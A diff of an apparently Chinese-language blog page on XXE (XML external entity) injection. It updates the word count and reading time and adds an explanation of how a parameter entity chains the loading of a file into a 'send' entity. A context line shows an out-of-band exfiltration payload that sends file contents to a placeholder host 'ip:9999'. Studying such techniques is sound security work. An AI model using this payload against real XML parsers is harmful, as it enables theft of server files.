@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    1.4k 字
+                    1.5k 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      6 分钟
+                      7 分钟
                   </span>
                 
 
@@ -285,7 +285,11 @@ continue</code></pre><h4 id="探测端口"><a href="#探测端口" class="header
 <blockquote>
 <p>&lt;!ENTITY % int “<a href="http://ip:9999?p=%file;&quot;&gt;" target="_blank" rel="noopener">http://ip:9999?p=%file;&quot;&gt;</a>   </p>
 </blockquote>
-<p>不行<br>2.xml解析和传递流程</p>
+<p>不行    </p>
+<blockquote>
+<p>定义int变量，它只是起到穿插作用，目的是编译里面的实体send；<br>在%file处访问资源，并将该位置的内容 加载到实体send。 </p>
+</blockquote>
+<p>2.xml解析和传递流程</p>
 
             <hr>
           </div>
